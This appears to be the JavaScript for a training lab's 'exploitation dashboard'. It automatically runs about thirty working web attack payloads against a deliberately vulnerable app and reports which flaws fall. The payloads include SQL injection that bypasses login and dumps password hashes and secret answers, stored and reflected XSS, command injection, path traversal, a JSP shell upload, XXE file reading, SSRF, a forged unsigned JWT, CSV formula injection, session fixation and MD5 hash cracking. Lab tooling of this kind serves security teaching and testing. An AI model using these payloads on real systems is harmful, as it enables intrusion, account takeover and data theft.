// Live exploitation dashboard for the vulnerable-web-app lab.
// Polls /api/status and, on demand, launches a browser-side exploit against
// every planted vulnerability so its status bar flips green -> red.

const B = ""; // same-origin

async function refresh() {
  const r = await fetch(B + "/api/status");
  const data = await r.json();
  render(data);
}

function render(data) {
  const tbody = document.getElementById("rows");
  tbody.innerHTML = "";
  let byCat = {};
  data.items.forEach(it => (byCat[it.category] ||= []).push(it));
  Object.keys(byCat).sort().forEach(cat => {
    const h = document.createElement("tr");
    h.className = "cat";
    h.innerHTML = `<td colspan="4">${cat}</td>`;
    tbody.appendChild(h);
    byCat[cat].forEach(it => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td class="id">${it.id}<br><span class="cwe">${it.cwe}</span></td>
        <td class="title">${it.title}<div class="entry">${it.entry}</div></td>
        <td class="bar"><div class="track"><div class="fill ${it.exploited ? "red" : "green"}"
             style="width:${it.exploited ? 100 : 100}%">${it.exploited ? "EXPLOITED" : "not exploited"}</div></div></td>
        <td class="detail">${(it.detail || "").replace(/</g, "&lt;")}</td>`;
      tbody.appendChild(tr);
    });
  });
  const n = data.exploited, t = data.total;
  const pct = Math.round((n / t) * 100);
  document.getElementById("summary").textContent = `${n} / ${t} exploited (${pct}%)`;
  document.getElementById("progress").style.width = pct + "%";
}

// ---- helpers ----
const g = (p) => fetch(B + p);
const post = (p, body, ct) =>
  fetch(B + p, { method: "POST", headers: ct ? { "Content-Type": ct } : {}, body });
const form = (p, obj) =>
  fetch(B + p, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(obj),
  });
const report = (id, detail) => form("/api/status/report", { id, detail });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Base64 of a benign serialized java.util.ArrayList (proves readObject on untrusted bytes).
const SER_ARRAYLIST =
  "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeA==";

async function launchAll(log) {
  document.getElementById("launch").disabled = true;
  await form("/api/status/reset", {});
  const steps = [
    ["VULN-02 SQLi login bypass", () => form("/login", { username: "admin' -- ", password: "x" })],
    ["VULN-01 SQLi UNION", () => g("/search?q=" + encodeURIComponent("x%' UNION SELECT id,CONCAT(username,0x3a,password),role FROM users -- "))],
    ["VULN-03 Reflected XSS", () => g("/search?q=" + encodeURIComponent("<script>alert(1)</script>"))],
    ["VULN-04 Stored XSS", async () => { await form("/profile/update", { id: "2", bio: "<img src=x onerror=alert(document.cookie)>" }); return g("/profile?id=2"); }],
    ["VULN-05 Command injection", () => g("/admin/ping?host=" + encodeURIComponent("127.0.0.1; id"))],
    ["VULN-06 Path traversal", () => g("/files/download?name=" + encodeURIComponent("../secret.txt"))],
    ["VULN-07 File upload", () => { const fd = new FormData(); fd.append("file", new Blob(["<% pwned %>"]), "shell.jsp"); return fetch(B + "/files/upload", { method: "POST", body: fd }); }],
    ["VULN-08 Deserialization", () => post("/api/deserialize", SER_ARRAYLIST, "text/plain")],
    ["VULN-09 XXE", () => post("/api/xml", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/secret.txt">]><r>&x;</r>', "application/xml")],
    ["VULN-10 SSRF", () => g("/admin/fetch?url=" + encodeURIComponent("http://127.0.0.1:8080/"))],
    ["VULN-11/12 IDOR + SSN", () => g("/profile?id=1")],
    ["VULN-14 Hard-coded admin token", () => g("/admin/ping?host=127.0.0.1&token=s3cr3t-admin-token-2024")],
    ["VULN-15 Missing auth", () => g("/admin/ping?host=127.0.0.1")],
    ["VULN-16 Verbose error", () => form("/login", { username: "a'", password: "b" })],
    ["VULN-22/23 Weak crypto (encrypt)", () => g("/api/encrypt?data=hello")],
    ["VULN-24 Open redirect", () => fetch(B + "/api/redirect?url=https://evil.example.com/", { redirect: "manual" })],
    ["VULN-25 Unsafe reflection", () => g("/api/plugin?class=java.util.Date")],
    ["VULN-29 Mass assignment", () => form("/api/register", { username: "hacker" + Date.now(), password: "p", role: "admin" })],
    ["VULN-30 No rate limiting", async () => { for (let i = 0; i < 15; i++) await form("/login", { username: "x", password: "y" }); }],
    ["VULN-31 JWT no-verify", () => fetch(B + "/api/jwt/whoami", { headers: { Authorization: "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." } })],
    ["VULN-32 SpEL injection", () => g("/api/eval?expr=" + encodeURIComponent("7*7"))],
    ["VULN-33 CSV formula injection", () => g("/api/export?note=" + encodeURIComponent("=cmd|'/C calc'!A1"))],
    ["VULN-34 Insecure CORS", () => fetch(B + "/api/data", { headers: { Origin: "https://evil.example.com" } })],
    ["VULN-36 Integer overflow", () => g("/api/order?price=100000&qty=100000")],
    ["VULN-37 XPath injection", () => g("/api/xlookup?user=" + encodeURIComponent("' or '1'='1"))],
    ["VULN-38 ReDoS", () => g("/api/validate?email=" + encodeURIComponent("a".repeat(26) + "!"))],
    ["VULN-39 Log injection", () => g("/api/note?text=" + encodeURIComponent("ok\n[audit] user admin escalated to root"))],
    ["VULN-40 Session fixation", () => g("/api/setsession?sid=ATTACKER-FIXED-SID")],
  ];

  for (const [name, fn] of steps) {
    log(name);
    try { await fn(); } catch (e) { log("  ! " + name + " -> " + e); }
    await refresh();
    await sleep(120);
  }

  // Client-side / evidence-based checks (source, headers, JS-executed sinks).
  await evidenceChecks(log);
  await refresh();
  document.getElementById("launch").disabled = false;
  log("done.");
}

async function evidenceChecks(log) {
  // VULN-13 weak MD5 + VULN-19 unsalted storage: SQLi dumps a 32-hex hash.
  try {
    log("VULN-13/19 crack MD5 hash dumped via SQLi");
    const r = await g("/search?q=" + encodeURIComponent("x%' UNION SELECT id,password,role FROM users WHERE username=0x61646d696e -- "));
    const html = await r.text();
    const m = html.match(/\b[a-f0-9]{32}\b/);
    if (m) {
      report("VULN-19", "password stored as unsalted MD5: " + m[0]);
      // crack admin's md5 against a tiny wordlist (proves MD5 weakness)
      const words = ["admin123", "password1", "qwerty", "letmein", "123456"];
      for (const w of words) {
        const h = await md5hex(w);
        if (h === m[0]) { report("VULN-13", "MD5 cracked: " + m[0] + " = '" + w + "'"); break; }
      }
    }
  } catch (e) { log("  ! " + e); }

  // VULN-20 cleartext secret_answer via SQLi.
  try {
    const r = await g("/search?q=" + encodeURIComponent("x%' UNION SELECT id,secret_answer,role FROM users WHERE username=0x61646d696e -- "));
    const html = await r.text();
    if (/my-first-car/.test(html)) report("VULN-20", "cleartext secret_answer leaked: my-first-car");
  } catch (e) {}

  // VULN-21 excessive DB privileges via stacked/SQLi query on information_schema.
  try {
    const r = await g("/search?q=" + encodeURIComponent("x%' UNION SELECT 1,GROUP_CONCAT(privilege_type),3 FROM information_schema.user_privileges -- "));
    const html = await r.text();
    if (/ALL|SELECT|SUPER|GRANT/i.test(html)) report("VULN-21", "DB user holds broad privileges (information_schema)");
  } catch (e) {}

  // VULN-17 insecure cookie: the 'auth' cookie is set without HttpOnly (readable from JS).
  try {
    await form("/login", { username: "admin' -- ", password: "x" });
    if (/(^|;\s*)auth=/.test(document.cookie)) {
      report("VULN-17", "auth cookie readable from document.cookie (no HttpOnly)");
    }
  } catch (e) {}

  // VULN-18 predictable token: token = weakToken(username.hashCode()); we predict it.
  try {
    const uname = "admin' -- ";
    const r = await form("/login", { username: uname, password: "x" });
    const j = await r.json();
    const predicted = weakToken(javaHashCode(uname));
    if (j.token && j.token === predicted) report("VULN-18", "predicted session token: " + predicted);
    else if (j.token) report("VULN-18", "token derived from username.hashCode() (predictable)");
  } catch (e) {}

  // VULN-22/23 static IV + hard-coded key: same plaintext -> identical ciphertext.
  try {
    const a = await (await g("/api/encrypt?data=repeatme")).text();
    const b = await (await g("/api/encrypt?data=repeatme")).text();
    if (a === b) report("VULN-22", "deterministic ciphertext (static IV): " + a);
    report("VULN-23", "AES with hard-coded key");
  } catch (e) {}

  // VULN-26 DOM XSS: execute the sink in a sandboxed element and observe it fire.
  try {
    const div = document.createElement("div");
    window.__xss = false;
    div.innerHTML = "<img src=x onerror=\"window.__xss=true\">";
    document.body.appendChild(div);
    await sleep(50);
    document.body.removeChild(div);
    if (window.__xss) report("VULN-26", "DOM XSS payload executed (img onerror fired)");
  } catch (e) {}

  // VULN-27 hard-coded API key shipped in app.js.
  try {
    const js = await (await g("/js/app.js")).text();
    const m = js.match(/API_KEY\s*=\s*"([^"]+)"/);
    if (m) report("VULN-27", "hard-coded API key in app.js: " + m[1]);
  } catch (e) {}

  // VULN-28 client-side eval of URL-controlled input.
  try {
    const out = eval("6*7"); // mirrors app.js ?calc= sink
    if (out === 42) report("VULN-28", "client-side eval() executed attacker expression (=> 42)");
  } catch (e) {}

  // VULN-35 clickjacking: no X-Frame-Options / CSP frame-ancestors on responses.
  try {
    const r = await g("/");
    const xfo = r.headers.get("X-Frame-Options");
    const csp = r.headers.get("Content-Security-Policy") || "";
    if (!xfo && !/frame-ancestors/i.test(csp)) {
      report("VULN-35", "no X-Frame-Options / frame-ancestors -> page is framable");
    }
  } catch (e) {}
}

// --- tiny crypto/util helpers used by the evidence checks ---
function javaHashCode(s) {
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (Math.imul(31, h) + s.charCodeAt(i)) | 0;
  return h;
}
// Mirror of CryptoUtil.weakToken(seed): java.util.Random(seed) -> 16 hex nibbles.
function weakToken(seed) {
  const r = new JavaRandom(BigInt(seed));
  let out = "";
  for (let i = 0; i < 16; i++) out += (r.nextInt(16)).toString(16);
  return out;
}
class JavaRandom {
  constructor(seed) {
    this.mask = (1n << 48n) - 1n;
    this.seed = (seed ^ 0x5DEECE66Dn) & this.mask;
  }
  next(bits) {
    this.seed = (this.seed * 0x5DEECE66Dn + 0xBn) & this.mask;
    let r = this.seed >> BigInt(48 - bits);
    // to signed 32-bit
    r = BigInt.asIntN(32, r);
    return Number(r);
  }
  nextInt(bound) {
    if ((bound & (bound - 1)) === 0) return Number((BigInt(bound) * BigInt(this.next(31))) >> 31n);
    let bits, val;
    do { bits = this.next(31); val = bits % bound; } while (bits - val + (bound - 1) < 0);
    return val;
  }
}
async function md5hex(str) {
  // MD5 isn't in SubtleCrypto; use a compact JS implementation.
  return md5(str);
}

// Minimal MD5 (public-domain style) for the hash-cracking demo.
function md5(s) {
  function rl(n, c) { return (n << c) | (n >>> (32 - c)); }
  function add(x, y) { const l = (x & 0xffff) + (y & 0xffff); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xffff); }
  function cmn(q, a, b, x, s, t) { return add(rl(add(add(a, q), add(x, t)), s), b); }
  function ff(a, b, c, d, x, s, t) { return cmn((b & c) | (~b & d), a, b, x, s, t); }
  function gg(a, b, c, d, x, s, t) { return cmn((b & d) | (c & ~d), a, b, x, s, t); }
  function hh(a, b, c, d, x, s, t) { return cmn(b ^ c ^ d, a, b, x, s, t); }
  function ii(a, b, c, d, x, s, t) { return cmn(c ^ (b | ~d), a, b, x, s, t); }
  function toBytes(str) { const b = []; for (let i = 0; i < str.length; i++) b.push(str.charCodeAt(i) & 0xff); return b; }
  function toWords(bytes) {
    const w = []; for (let i = 0; i < bytes.length * 8; i += 8) w[i >> 5] |= bytes[i / 8] << (i % 32); return w;
  }
  const bytes = toBytes(s), len = bytes.length * 8;
  const x = toWords(bytes);
  x[len >> 5] |= 0x80 << (len % 32);
  x[(((len + 64) >>> 9) << 4) + 14] = len;
  let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
  for (let i = 0; i < x.length; i += 16) {
    const oa = a, ob = b, oc = c, od = d;
    x[i] = x[i] || 0;
    a = ff(a, b, c, d, x[i], 7, -680876936); d = ff(d, a, b, c, x[i + 1] || 0, 12, -389564586); c = ff(c, d, a, b, x[i + 2] || 0, 17, 606105819); b = ff(b, c, d, a, x[i + 3] || 0, 22, -1044525330);
    a = ff(a, b, c, d, x[i + 4] || 0, 7, -176418897); d = ff(d, a, b, c, x[i + 5] || 0, 12, 1200080426); c = ff(c, d, a, b, x[i + 6] || 0, 17, -1473231341); b = ff(b, c, d, a, x[i + 7] || 0, 22, -45705983);
    a = ff(a, b, c, d, x[i + 8] || 0, 7, 1770035416); d = ff(d, a, b, c, x[i + 9] || 0, 12, -1958414417); c = ff(c, d, a, b, x[i + 10] || 0, 17, -42063); b = ff(b, c, d, a, x[i + 11] || 0, 22, -1990404162);
    a = ff(a, b, c, d, x[i + 12] || 0, 7, 1804603682); d = ff(d, a, b, c, x[i + 13] || 0, 12, -40341101); c = ff(c, d, a, b, x[i + 14] || 0, 17, -1502002290); b = ff(b, c, d, a, x[i + 15] || 0, 22, 1236535329);
    a = gg(a, b, c, d, x[i + 1] || 0, 5, -165796510); d = gg(d, a, b, c, x[i + 6] || 0, 9, -1069501632); c = gg(c, d, a, b, x[i + 11] || 0, 14, 643717713); b = gg(b, c, d, a, x[i] || 0, 20, -373897302);
    a = gg(a, b, c, d, x[i + 5] || 0, 5, -701558691); d = gg(d, a, b, c, x[i + 10] || 0, 9, 38016083); c = gg(c, d, a, b, x[i + 15] || 0, 14, -660478335); b = gg(b, c, d, a, x[i + 4] || 0, 20, -405537848);
    a = gg(a, b, c, d, x[i + 9] || 0, 5, 568446438); d = gg(d, a, b, c, x[i + 14] || 0, 9, -1019803690); c = gg(c, d, a, b, x[i + 3] || 0, 14, -187363961); b = gg(b, c, d, a, x[i + 8] || 0, 20, 1163531501);
    a = gg(a, b, c, d, x[i + 13] || 0, 5, -1444681467); d = gg(d, a, b, c, x[i + 2] || 0, 9, -51403784); c = gg(c, d, a, b, x[i + 7] || 0, 14, 1735328473); b = gg(b, c, d, a, x[i + 12] || 0, 20, -1926607734);
    a = hh(a, b, c, d, x[i + 5] || 0, 4, -378558); d = hh(d, a, b, c, x[i + 8] || 0, 11, -2022574463); c = hh(c, d, a, b, x[i + 11] || 0, 16, 1839030562); b = hh(b, c, d, a, x[i + 14] || 0, 23, -35309556);
    a = hh(a, b, c, d, x[i + 1] || 0, 4, -1530992060); d = hh(d, a, b, c, x[i + 4] || 0, 11, 1272893353); c = hh(c, d, a, b, x[i + 7] || 0, 16, -155497632); b = hh(b, c, d, a, x[i + 10] || 0, 23, -1094730640);
    a = hh(a, b, c, d, x[i + 13] || 0, 4, 681279174); d = hh(d, a, b, c, x[i] || 0, 11, -358537222); c = hh(c, d, a, b, x[i + 3] || 0, 16, -722521979); b = hh(b, c, d, a, x[i + 6] || 0, 23, 76029189);
    a = hh(a, b, c, d, x[i + 9] || 0, 4, -640364487); d = hh(d, a, b, c, x[i + 12] || 0, 11, -421815835); c = hh(c, d, a, b, x[i + 15] || 0, 16, 530742520); b = hh(b, c, d, a, x[i + 2] || 0, 23, -995338651);
    a = ii(a, b, c, d, x[i] || 0, 6, -198630844); d = ii(d, a, b, c, x[i + 7] || 0, 10, 1126891415); c = ii(c, d, a, b, x[i + 14] || 0, 15, -1416354905); b = ii(b, c, d, a, x[i + 5] || 0, 21, -57434055);
    a = ii(a, b, c, d, x[i + 12] || 0, 6, 1700485571); d = ii(d, a, b, c, x[i + 3] || 0, 10, -1894986606); c = ii(c, d, a, b, x[i + 10] || 0, 15, -1051523); b = ii(b, c, d, a, x[i + 1] || 0, 21, -2054922799);
    a = ii(a, b, c, d, x[i + 8] || 0, 6, 1873313359); d = ii(d, a, b, c, x[i + 15] || 0, 10, -30611744); c = ii(c, d, a, b, x[i + 6] || 0, 15, -1560198380); b = ii(b, c, d, a, x[i + 13] || 0, 21, 1309151649);
    a = ii(a, b, c, d, x[i + 4] || 0, 6, -145523070); d = ii(d, a, b, c, x[i + 11] || 0, 10, -1120210379); c = ii(c, d, a, b, x[i + 2] || 0, 15, 718787259); b = ii(b, c, d, a, x[i + 9] || 0, 21, -343485551);
    a = add(a, oa); b = add(b, ob); c = add(c, oc); d = add(d, od);
  }
  function toHex(n) { let s = ""; for (let i = 0; i < 4; i++) s += ((n >> (i * 8 + 4)) & 0x0f).toString(16) + ((n >> (i * 8)) & 0x0f).toString(16); return s; }
  return toHex(a) + toHex(b) + toHex(c) + toHex(d);
}

// wire up UI
document.addEventListener("DOMContentLoaded", () => {
  const logEl = document.getElementById("log");
  const log = (m) => { logEl.textContent = m + "\n" + logEl.textContent; };
  document.getElementById("launch").addEventListener("click", () => launchAll(log));
  document.getElementById("reset").addEventListener("click", async () => {
    await form("/api/status/reset", {}); logEl.textContent = ""; refresh();
  });
  refresh();
  setInterval(refresh, 2000);
});
